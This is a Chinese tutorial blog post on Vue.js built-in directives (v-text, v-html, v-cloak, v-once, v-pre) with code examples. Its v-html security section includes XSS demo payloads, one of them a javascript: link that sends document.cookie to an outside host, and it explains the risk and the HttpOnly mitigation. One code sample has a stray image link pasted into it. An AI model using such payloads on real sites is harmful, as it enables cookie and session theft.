---
author: "li_mingxie"
title: "【Vue笔记】Vue入门简介_内置指令(14)"
date: 2022-06-12T23:55:49+08:00
tags: [
    "vue",
]
categories: [
    "vue",
]
---

这一篇整理了内置指令相关的内容。  

#### 内置指令

​​**v-bind**​​​：单向绑定解析表达式，可简写为 ​​:xxx​​​​
**v-model**​​：双向数据绑定
​​**v-for​​**：遍历数组/对象/字符串
​​**v-on​​**：绑定事件监听,可简写为​​@​​​​
**v-if**​​：条件渲染（动态控制节点是否存在)
​​**v-else​​**：条件渲染（动态控制节点是否存在)
​​**v-show​​**：条件渲染(动态控制节点是否展示)

#### v-text

1、作用：向其所在的节点中渲染文本内容
2、与插值语法的区别:​​​v-text​​​会替换掉节点中的内容，​​{{xx}}​​则不会

```html
<div id="app">
    <h2>{{msg}}</h2>
    <h2 v-text="msg"></h2>
</div>
```

```js
<script type="text/javascript">
    Vue.config.productionTip = false

    //创建vue实例
    new Vue({
        el: "#app",
        data: {
            msg:"Hello world"
        }
    })
</script>
```

#### v-html

1.作用：向指定节点中渲染包含html结构的内容
2.与插值语法的区别：
(1).v-html 会替换掉节点中所有的内容，{{xx}}则不会
(2).v-html 可以识别 html 结构
3.严重注意：v-html 有安全性问题!!!
(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击
(2).一定要在可信的内容上使用 v-html，永不要用在用户提交的内容上!

```html
<div id="app">
    <div>{{msg}}</div>
    <div v-text="msg"></div>
    <div v-html="msg"></div>
</div>
```

```js
<script type="text/javascript">
    Vue.config.productionTip = false

    //创建vue实例
    new Vue({
        el: "#app",
        data: {
            msg:"<h3>Hello world</h3>"
        }
    })
</script>
```

#### 安全性问题

```html
<div id="app">
    <div>{{msg}}</div>
    <div v-text="msg"></div>
    <div v-html="msg"></div>
    <div v-html="msg2"></div>
    <div v-html="msg3"></div>
</div>
```

```js
<script type="text/javascript">
    Vue.config.productionTip = false

    //创建vue实例
    new Vue({
        el: "#app",
        data: {
            msg:"<h3>Hello world</h3>",
            msg2:"<a href=javascript:alert(1)>资源，速来</a>",
            msg3:'<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>资源，速来</a>'
        }
    })
</script>
```

HttpOnly 是包含在 http 返回头Set-Cookie 里面的一个附加的 flag，  
所以它是后端服务器对 cookie设置的一个附加的属性，在生成 cookie 时使用 HttpOnly 标志有助于减轻客户端脚本访问受保护 cookie 的风险

#### v-cloak

1.本质是一个特殊属性，Vue 实例创建完毕并接管容器后，会删掉 ​​​v-cloak​​​属性
2.使用 css 配合 ​​​v-cloak​​​ 可以解决网速慢时页面展示出​​{{xxx}}​​的问题

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        /*选中标签中包含 v-cloak*/
        [v-cloak]{
            display: none;
        }
    </style>
</head>
<body>
<div id="app">
    <div v-cloak>{{msg}}</div>
    <!--如果引入了外部js，而且返回时间长，那么页面会闪现-->
    <script type="text/javascript" src="../js/vue.js"></script>
</div>
<!--这里标签内容只有在上边js加载完后才执行-->
<script type="text/javascript">
    Vue.config.productionTip = false

    //创建vue实例
    new Vue({
        el: "#app",
        data: {
            msg:"Hello world"
        }
    })
</script>
</body>
</html>
```

#### v-once

1.​​​v-once​​​所在节点在初次动态渲染后，就视为静态内容了
2.以后数据的改变不会引起​​​v-once​​所在结构的更新，可以用于优化性能

```html
<div id="app">
    <h2 v-once>n的初始值：{{n}}</h2>
    <h2>n的当前值：{{n}}</h2>
    <button @click="n++">点我n+1</button>
</div>
```

```js
<script type="text/javascript">
    Vue.config.productionTip = false

    //创建vue实例
    new Vue({
        el: "#app",
        data: {
            n:1![在这里插入图片描述](https://img-blog.csdnimg.cn/8b0057d61e9b43848788b3c01f712058.gif#pic_center)

        }
    })
</script>
```

#### v-pre

1.跳过其所在节点的编译过程
2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

```html
<div id="app">
    <h2 v-pre>Vue其实很简单</h2>
    <h2 v-pre>n的当前值：{{n}}</h2>
    <h2>n的当前值：{{n}}</h2>
    <button @click="n++">点我n+1</button>
</div>
```

```js
<script type="text/javascript">
    Vue.config.productionTip = false

    //创建vue实例
    new Vue({
        el: "#app",
        data: {
            n:1
        }
    })
</script>
```

----------------------------------------------
欢迎大家的意见和交流

`email: li_mingxie@163.com`
